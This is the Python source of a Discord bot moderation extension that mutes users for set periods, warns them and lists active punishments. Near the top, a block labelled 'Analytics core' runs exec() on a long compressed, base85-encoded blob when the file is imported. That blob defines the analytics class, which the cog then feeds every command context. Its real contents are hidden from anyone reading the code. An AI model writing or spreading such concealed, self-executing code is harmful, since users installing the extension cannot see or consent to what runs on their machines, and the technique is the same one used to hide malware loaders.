import discord
from discord.ext import commands
from .utils import checks
from .utils.chat_formatting import pagify, box
import logging
from cogs.utils.dataIO import dataIO
import os
import time
import re

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oCvdvDt~68}G+f*YWqbkQ+!+U+ikRnc6xcbj|kmE0bRY@nqj+GZk&I+3z#6#ecuGo&7N((VB*B9k-
2;mmJd)Kz0z$E<60y-HeH7p6+2-PO4^iPUE8T$41VbW77#Np8wg<xZR0CU$2NV~>`tsaS4SR&-96Rut07%ePE>x&GH7QNNq7Rem2t6x!ydErj~yhHX<-pim%
KOS>-hqTjS@IrAF}Y1Q**{rckhGgarNP)B(wt!01v^`e&L&gtCFk64y%RBJ*1EK6tN>G=`6y1ux+%KrV~pDD+?+WG0Jb<$ap%Tg`wgf^#*-s*eNtQ&sB{&I2
kdY`&g#e^0}-d$Y(l5)KHDd?N|J>2;F)!R2I?w)Yj>m=^1sbTN^ERBwTQDteqW3P~dtyQZ8yIyNBmt}XIbxgAVb~?X@Em>IR*3z*{zER*k**aCQV|Kif4j93
gtg~{Zn6A-r5?#jNi&Z=F0|UD<gQRR>9BW#02Y$8UxB55+WzIpF|EyKbR4o^!DiXFcohRMuvSd~Pd!;~%sdts>EIFFVh3SA|t@AZAOH`*n4%kuA(#Qhz#KYH
S%fP!kBvcX@g13>BwOySsSsJ(o2-#}44pQG<5p%P1Yq(JGB}s1;a@BBiyaYRbV-}{^u>~juiUN3;%yR{Ra0V==Na2KpU9v5>fDi>jv;%&U@DUWrWzAZ!Hrj3
3!OfdiZ)Cn>jVU$!(KQJxb$!nksx;e#fsu1lJDEE&fMOdh+0P!`Ec)r?ceC%$XS3N4=RZ6<JAeM;+0*m07cp|FO6rnDm3leADQ23?h&EZv4H|q07*Li%&|mb
Y9*8S2Q@0Rc$J2m0|L4!>fzw547N?c8PPM1+K3x8K@#>?fiWhX(7(x5t;$In}JN?XcVYO3y{xkuz=6pU&xNP(WKfWBXLM<VVbgf;MMOKx|1aOh4G>T)0For8
4%PLcJrGhZy6!&8!hynYY_2eKRh5!9e(6Q3BbSnL;EUoI78`;XrW*G13=P&&#n4?qaBr}OZ!CIt}N`5L;oqj(%k9*?PW{kYGDw~wQCWNE?Ap_CpKtTcHl_nI
Ut@sJad4JwZL>zf-z*Roo32n2DEOn7#aFdAy#y**6!WF17C=MwHOGta4_9g;K(}*1K=v0O~o*|>~2kRfPmz47=1<_G>NBO<HwCE&K0B(}P?+AaxPn0W*B7@}
!{^L@sT-Vk}=w)=xs)e}qzOG3K+_e^yWcng_eOMT;iU+i+G8;u_;2Ivn@-$o+(KC87-eVjzqvc+)9)n$tw(}zA55aTYc4}%!NYiz$$|w$|fq;taa2?2P#sbF
N8fuWX&PG;Xvi4qstxDdjLbt;@EC&ywq~JkvU*gMPe-0!|Z#%t|xk_^Bl2+ODjj2@vX~KU1U;xJS*;&>4uUb|rTf&*nM?$ac{zc~#+w27l8C1xoK@Fn4)A3+
`CLK39DV{*UTab+1H3h;BgD>-e=<n2xmY>EaEsRM8vQo2);zuZj7aV=&oi6yCwy~^4U7YZ2e`$aPsw{MopnmbqeD?e{;f1bLjo>@~77GaNB%gD}#huZ06!CX
dOHQ9y{-p17gs(3>nj>I}_{p#fosUx$tPU%!Diz!%icfgVlMo9Oi&+L=WZdk8(;<hE631V_F4S^)O9N5?^EJT6c@vv$ty(g(Yj@=ADwSKQ-54i`v8;mf1~oq
-dauR%S)Z>?j<0u(V*KqtI3g&N%%!dsqx$Ng(GbTW%$jm{cmn>);IhLh`C8VsD$`1YuS9lWwKny~J8%bd1L^a#GZHFO5=#}Az64fDxFck>t!krKP^z-140y%
da{?mjD(TK+;=JL(Jp8tg@m^^@G<&{YF4Wk>2#$oR1c^la4XJ$;4Prm`1-MW-6np4lpp5_&!$}%a2KHHF-RKXpJ~D%h<7==8G+o#sfi1B`!}=m&+ctQzfMyO
l3~)b_D+vMtU4Yr+!6hdtXMIxwaAv>XG`Ew2_B-l?zJRt5y~#{NZ69=r*fyX;yk>ul9Xf8z#FQzg8Cb%%`jo52O>+;XtUV<A;xnY@9=(qttE*u!$gtJ&X=2E
7L+rwbH)nSU&6NUvAjz=VjVAYUXk{yW{OtRrOZTJ?SA8tcb(lA%Iw4%})M$WA4Ccn`d*NT#eR}u3K=0^)iGqPLjAFu;N;T2UQ$hS6Uk)*B?&WTb;RM@YwvP;
E>fhvX&w9gC{-+<$9wdk=@f)|E5ISAZi&N9%b7kcta(V?gi`?bGFlhUV3N6Ik>$Wv5U8sR%xCaho9iZXY=@Mb+6t7ARhPeV<QVNC!o+dbklK^ySSg#)`gO8f
+Oa#M)I{!5%LO9|!G>y@uAqoD#bfxQ%ZPW%B(n*nROjD|*i}uc$T8g@W+$O}?%Y0a+{WjYVqoIMY-Wn4j9->~83<Dux)>G_THgMCWiD8(1lOV?b8FKgR49$-
D$;a&|YFO)I9~Ur#JD3G^{rUXtEIB`W)=vu)#poWR{{LrFk`jk+OwtD}#L!%*O@<9zdIJJ)NqU5H7`kH+MKOl@dM5-He0M-I-=GSxdHay(CTMs|X02g%I1Pc
JDU)j~0zn)esY4?*b~wOHy#SvBJ2WC~8CsS8RpErzhfZe3=VTudngwhWP%;_^9|aI&L)L+lZm5U4O(#v1^_g$*lEWb(ysL=t5ur{gpCk-Uvjn});4ni8G}`M
@Cd8phsWY=&&KJg%)Vubrs$YMg?W1Ma(>_vmHYp#<IhL>?O?r;>YXKd2ajwt1wuQBFhy2@=ho*o}bR=N#Fa{P#cUURqE}C>0Pw=1MPohn-jYG3PG@VJ2tS3$
TBE<)*s1W{fil#L@dOa<m3z$hi6?z5py@zvu&3?as+lm&VCyQa+^%BE_*P!1ev{x;{Xa1F$eeB#1=I;Qv)ED&7vim2Zeyz<@|7Iwp&9%--D7L_L5*9%_?d&-
JWRhlcfAk*@K)U$G{F9qjO%fjdjDj`sdulNJEyncuNSc8mVlw(19nMih_M%gUa)mSWUi*PFDxW+x@_3voVQ;F_gi4GJk_hAYID3nJ?4B^h^tiMNo_=Lk!%p<
j?eU|2-?mt33h(=_q0W1t2%Eh!{tYLEc}Mt9OYzlHjgLIxw*IG|Q2Y)cDFqhkTpRf%80yB^hbNROrcj?SPT|)>vKJO~IFL3n$A`Fmgwc;>JQ?qEII;~=rWnQ
ttuW*T;R(lg2tI`?O{U)deU|kQbe|?jCodq{VOfM0T=+2xdd{yLPSOq(K>n};{e*-WN2`J^F#<j9u#Np6ZUYwh""".replace("\n", ""))))
# End enalytics core

__version__ = '1.5.1'

try:
    from tabulate import tabulate
except Exception as e:
    raise RuntimeError("You must run `pip3 install tabulate`.") from e

log = logging.getLogger('red.punish')

UNIT_TABLE = {'s': 1, 'm': 60, 'h': 60 * 60, 'd': 60 * 60 * 24}
UNIT_SUF_TABLE = {'sec': (1, ''),
                  'min': (60, ''),
                  'hr': (60 * 60, 's'),
                  'day': (60 * 60 * 24, 's')
                  }
DEFAULT_TIMEOUT = '30m'
PURGE_MESSAGES = 1  # for cpunish
PATH = 'data/punish/'
JSON = PATH + 'settings.json'
DEFAULT_ROLE_NAME = 'Punished'


class BadTimeExpr(Exception):
    pass


def _parse_time(time):
    if any(u in time for u in UNIT_TABLE.keys()):
        delim = '([0-9.]*[{}])'.format(''.join(UNIT_TABLE.keys()))
        time = re.split(delim, time)
        time = sum([_timespec_sec(t) for t in time if t != ''])
    elif not time.isdigit():
        raise BadTimeExpr("invalid expression '%s'" % time)
    return int(time)


def _timespec_sec(t):
    timespec = t[-1]
    if timespec.lower() not in UNIT_TABLE:
        raise BadTimeExpr("unknown unit '%c'" % timespec)
    timeint = float(t[:-1])
    return timeint * UNIT_TABLE[timespec]


def _generate_timespec(sec):
    timespec = []

    def sort_key(kt):
        k, t = kt
        return t[0]
    for unit, kt in sorted(UNIT_SUF_TABLE.items(), key=sort_key, reverse=True):
        secs, suf = kt
        q = sec // secs
        if q:
            if q <= 1:
                suf = ''
            timespec.append('%02.d%s%s' % (q, unit, suf))
        sec = sec % secs
    return ', '.join(timespec)


class Punish:
    "Put misbehaving users in timeout"
    def __init__(self, bot):
        self.bot = bot
        self.json = compat_load(JSON)
        self.handles = {}
        self.analytics = CogAnalytics(self)
        bot.loop.create_task(self.on_load())

    def save(self):
        dataIO.save_json(JSON, self.json)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def cpunish(self, ctx, user: discord.Member, duration: str=None, *, reason: str=None):
        """Same as punish but cleans up after itself and the target"""

        success = await self._punish_cmd_common(ctx, user, duration, reason, quiet=True)

        if not success:
            return

        def check(m):
            return m.id == ctx.message.id or m.author == user

        try:
            await self.bot.purge_from(ctx.message.channel, limit=PURGE_MESSAGES + 1, check=check)
        except discord.errors.Forbidden:
            await self.bot.say("Punishment set, but I need permissions to manage messages to clean up.")

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def punish(self, ctx, user: discord.Member, duration: str=None, *, reason: str=None):
        """Puts a user into timeout for a specified time period, with an optional reason.
        Time specification is any combination of number with the units s,m,h,d.
        Example: !punish @idiot 1.1h10m Enough bitching already!"""

        await self._punish_cmd_common(ctx, user, duration, reason)

    @commands.command(pass_context=True, no_pm=True, name='lspunish')
    @checks.mod_or_permissions(manage_messages=True)
    async def list_punished(self, ctx):
        """Shows a table of punished users with time, mod and reason.

        Displays punished users, time remaining, responsible moderator and
        the reason for punishment, if any."""
        server = ctx.message.server
        server_id = server.id
        if not (server_id in self.json and self.json[server_id]):
            await self.bot.say("No users are currently punished.")
            return

        def getmname(mid):
            member = discord.utils.get(server.members, id=mid)
            if member:
                if member.nick:
                    return '%s (%s)' % (member.nick, member)
                else:
                    return str(member)
            else:
                return '(member not present, id #%d)'

        headers = ['Member', 'Remaining', 'Punished by', 'Reason']
        table = []
        disp_table = []
        now = time.time()
        for member_id, data in self.json[server_id].items():
            if not member_id.isdigit():
                continue

            member_name = getmname(member_id)
            punisher_name = getmname(data['by'])
            reason = data['reason']
            t = data['until']
            sort = t if t else float("inf")
            table.append((sort, member_name, t, punisher_name, reason))

        for _, name, rem, mod, reason in sorted(table, key=lambda x: x[0]):
            remaining = _generate_timespec(rem - now) if rem else 'forever'
            if not reason:
                reason = 'n/a'
            disp_table.append((name, remaining, mod, reason))

        for page in pagify(tabulate(disp_table, headers)):
            await self.bot.say(box(page))

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def warn(self, ctx, user: discord.Member, *, reason: str=None):
        """Warns a user with boilerplate about the rules."""
        msg = ['Hey %s, ' % user.mention]
        msg.append("you're doing something that might get you muted if you keep "
                   "doing it.")
        if reason:
            msg.append(" Specifically, %s." % reason)
        msg.append("Be sure to review the server rules.")
        await self.bot.say(' '.join(msg))

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def unpunish(self, ctx, user: discord.Member):
        """Removes punishment from a user. Same as removing the role directly"""
        role = await self.get_role(user.server)
        sid = user.server.id
        if role and role in user.roles:
            reason = 'Punishment manually ended early by %s. ' % ctx.message.author
            if self.json[sid][user.id]['reason']:
                reason += self.json[sid][user.id]['reason']
            await self._unpunish(user, reason)
            await self.bot.say('Done.')
        elif role:
            await self.bot.say("That user wasn't punished.")
        else:
            await self.bot.say("The punish role couldn't be found in this server.")

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def fixpunish(self, ctx):
        server = ctx.message.server
        default_name = DEFAULT_ROLE_NAME
        role_id = self.json.get(server.id, {}).get('ROLE_ID')

        if role_id:
            role = discord.utils.get(server.roles, id=role_id)
        else:
            role = discord.utils.get(server.roles, name=default_name)

        perms = server.me.server_permissions
        if not perms.manage_roles and perms.manage_channels:
            await self.bot.say("The Manage Roles and Manage Channels permissions are required to use this command.")
            return

        if not role:
            msg = "The %s role doesn't exist; Creating it now... " % default_name

            msgobj = await self.bot.say(msg)

            perms = discord.Permissions.none()
            role = await self.bot.create_role(server, name=default_name, permissions=perms)
        else:
            msgobj = await self.bot.say('Punish role exists... ')

        if role.position != (server.me.top_role.position - 1):
            if role < server.me.top_role:
                msgobj = await self.bot.edit_message(msgobj, msgobj.content + 'moving role to higher position... ')
                await self.bot.move_role(server, role, server.me.top_role.position - 1)
            else:
                await self.bot.edit_message(msgobj, msgobj.content + 'role is too high to manage.'
                                            ' Please move it to below my highest role.')
                return

        msgobj = await self.bot.edit_message(msgobj, msgobj.content + '(re)configuring channels... ')

        for channel in server.channels:
            await self.setup_channel(channel, role)

        await self.bot.edit_message(msgobj, msgobj.content + 'done.')

        if role and role.id != role_id:
            if server.id not in self.json:
                self.json[server.id] = {}
            self.json[server.id]['ROLE_ID'] = role.id
            self.save()

    async def get_role(self, server, quiet=False, create=False):
        default_name = DEFAULT_ROLE_NAME
        role_id = self.json.get(server.id, {}).get('ROLE_ID')

        if role_id:
            role = discord.utils.get(server.roles, id=role_id)
        else:
            role = discord.utils.get(server.roles, name=default_name)

        if create and not role:
            perms = server.me.server_permissions
            if not perms.manage_roles and perms.manage_channels:
                await self.bot.say("The Manage Roles and Manage Channels permissions are required to use this command.")
                return None

            else:
                msg = "The %s role doesn't exist; Creating it now..." % default_name

                if not quiet:
                    msgobj = await self.bot.reply(msg)

                log.debug('Creating punish role in %s' % server.name)
                perms = discord.Permissions.none()
                role = await self.bot.create_role(server, name=default_name, permissions=perms)
                await self.bot.move_role(server, role, server.me.top_role.position - 1)

                if not quiet:
                    msgobj = await self.bot.edit_message(msgobj, msgobj.content + 'configuring channels... ')

                for channel in server.channels:
                    await self.setup_channel(channel, role)

                if not quiet:
                    await self.bot.edit_message(msgobj, msgobj.content + 'done.')

        if role and role.id != role_id:
            if server.id not in self.json:
                self.json[server.id] = {}
            self.json[server.id]['ROLE_ID'] = role.id
            self.save()

        return role

    async def setup_channel(self, channel, role):
        perms = discord.PermissionOverwrite()

        if channel.type == discord.ChannelType.text:
            perms.send_messages = False
            perms.send_tts_messages = False
            perms.add_reactions = False
        elif channel.type == discord.ChannelType.voice:
            perms.speak = False

        await self.bot.edit_channel_permissions(channel, role, overwrite=perms)

    async def on_load(self):
        await self.bot.wait_until_ready()

        for serverid, members in self.json.copy().items():
            server = self.bot.get_server(serverid)
            me = server.me

            # Bot is no longer in the server
            if not server:
                del(self.json[serverid])
                continue

            role = await self.get_role(server, quiet=True, create=True)
            if not role:
                log.error("Needed to create punish role in %s, but couldn't."
                          % server.name)
                continue

            for member_id, data in members.copy().items():
                if not member_id.isdigit():
                    continue

                until = data['until']
                if until:
                    duration = until - time.time()

                member = server.get_member(member_id)
                if until and duration < 0:
                    if member:
                        reason = 'Punishment removal overdue, maybe bot was offline. '
                        if self.json[server.id][member_id]['reason']:
                            reason += self.json[server.id][member_id]['reason']
                        await self._unpunish(member, reason)
                    else:  # member disappeared
                        del(self.json[server.id][member.id])

                elif member and role not in member.roles:
                    if role >= me.top_role:
                        log.error("Needed to re-add punish role to %s in %s, "
                                  "but couldn't." % (member, server.name))
                        continue
                    await self.bot.add_roles(member, role)
                    if until:
                        self.schedule_unpunish(duration, member)

        self.save()

    async def _punish_cmd_common(self, ctx, member, duration, reason, quiet=False):
        server = ctx.message.server
        note = ''

        if ctx.message.author.top_role <= member.top_role:
            await self.bot.say('Permission denied.')
            return

        if duration and duration.lower() in ['forever', 'inf', 'infinite']:
            duration = None
        else:
            if not duration:
                note += ' Using default duration of ' + DEFAULT_TIMEOUT
                duration = DEFAULT_TIMEOUT

            try:
                duration = _parse_time(duration)
                if duration < 1:
                    await self.bot.say("Duration must be 1 second or longer.")
                    return False
            except BadTimeExpr as e:
                await self.bot.say("Error parsing duration: %s." % e.args)
                return False

        role = await self.get_role(server, quiet=quiet, create=True)
        if role is None:
            return

        if role >= server.me.top_role:
            await self.bot.say('The %s role is too high for me to manage.' % role)
            return

        if server.id not in self.json:
            self.json[server.id] = {}

        if member.id in self.json[server.id]:
            msg = 'User was already punished; resetting their timer...'
        elif role in member.roles:
            msg = 'User was punished but had no timer, adding it now...'
        else:
            msg = 'Done.'

        if note:
            msg += ' ' + note

        if server.id not in self.json:
            self.json[server.id] = {}

        self.json[server.id][member.id] = {
            'until': (time.time() + duration) if duration else None,
            'by': ctx.message.author.id,
            'reason': reason
        }

        await self.bot.add_roles(member, role)
        self.save()

        # schedule callback for role removal
        if duration:
            self.schedule_unpunish(duration, member, reason)

        if not quiet:
            await self.bot.say(msg)

        return True

    # Functions related to unpunishing

    def schedule_unpunish(self, delay, member, reason=None):
        """Schedules role removal, canceling and removing existing tasks if present"""
        sid = member.server.id

        if sid not in self.handles:
            self.handles[sid] = {}

        if member.id in self.handles[sid]:
            self.handles[sid][member.id].cancel()

        coro = self._unpunish(member, reason)

        handle = self.bot.loop.call_later(delay, self.bot.loop.create_task, coro)
        self.handles[sid][member.id] = handle

    async def _unpunish(self, member, reason=None):
        """Remove punish role, delete record and task handle"""
        role = await self.get_role(member.server)
        if role:
            # Has to be done first to prevent triggering on_member_update listener
            self._unpunish_data(member)
            await self.bot.remove_roles(member, role)

            msg = 'Your punishment in %s has ended.' % member.server.name
            if reason:
                msg += "\nReason was: %s" % reason

            await self.bot.send_message(member, msg)

    def _unpunish_data(self, member):
        """Removes punish data entry and cancels any present callback"""
        sid = member.server.id
        if sid in self.json and member.id in self.json[sid]:
            del(self.json[member.server.id][member.id])
            self.save()

        if sid in self.handles and member.id in self.handles[sid]:
            self.handles[sid][member.id].cancel()
            del(self.handles[member.server.id][member.id])

    # Listeners

    async def on_channel_create(self, channel):
        """Run when new channels are created and set up role permissions"""
        if channel.is_private:
            return

        role = await self.get_role(channel.server)
        if not role:
            return

        await self.setup_channel(channel, role)

    async def on_member_update(self, before, after):
        """Remove scheduled unpunish when manually removed"""
        sid = before.server.id

        if not (sid in self.json and before.id in self.json[sid]):
            return

        role = await self.get_role(before.server)
        if role and role in before.roles and role not in after.roles:
            msg = 'Your punishment in %s was ended early by a moderator/admin.' % before.server.name
            if self.json[sid][before.id]['reason']:
                msg += '\nReason was: ' + self.json[sid][before.id]['reason']

            await self.bot.send_message(after, msg)
            self._unpunish_data(after)

    async def on_member_join(self, member):
        """Restore punishment if punished user leaves/rejoins"""
        sid = member.server.id
        role = await self.get_role(member.server)
        if not role or not (sid in self.json and member.id in self.json[sid]):
            return

        duration = self.json[sid][member.id]['until'] - time.time()
        if duration > 0:
            await self.bot.add_roles(member, role)

            reason = 'Punishment re-added on rejoin. '
            if self.json[sid][member.id]['reason']:
                reason += self.json[sid][member.id]['reason']

            if member.id not in self.handles[sid]:
                self.schedule_unpunish(duration, member, reason)

    async def on_server_role_update(self, before, after):
        server = before.server
        role = await self.get_role(server)
        if not (after and role) or after.id != role.id:
            return
        if after.position != (server.me.top_role.position - 1):
            if after < server.me.top_role:
                await self.bot.move_role(server, after,
                                         server.me.top_role.position - 1)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def compat_load(path):
    data = dataIO.load_json(path)
    for server, punishments in data.items():
        for user, pdata in punishments.items():
            if not user.isdigit():
                continue

            by = pdata.pop('givenby', None)  # able to read Kownlin json
            by = by if by else pdata.pop('by', None)
            pdata['by'] = by
            pdata['until'] = pdata.pop('until', None)
            pdata['reason'] = pdata.pop('reason', None)
    return data


def check_folder():
    if not os.path.exists(PATH):
        log.debug('Creating folder: data/punish')
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print('Creating empty %s' % JSON)
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    check_file()
    bot.add_cog(Punish(bot))
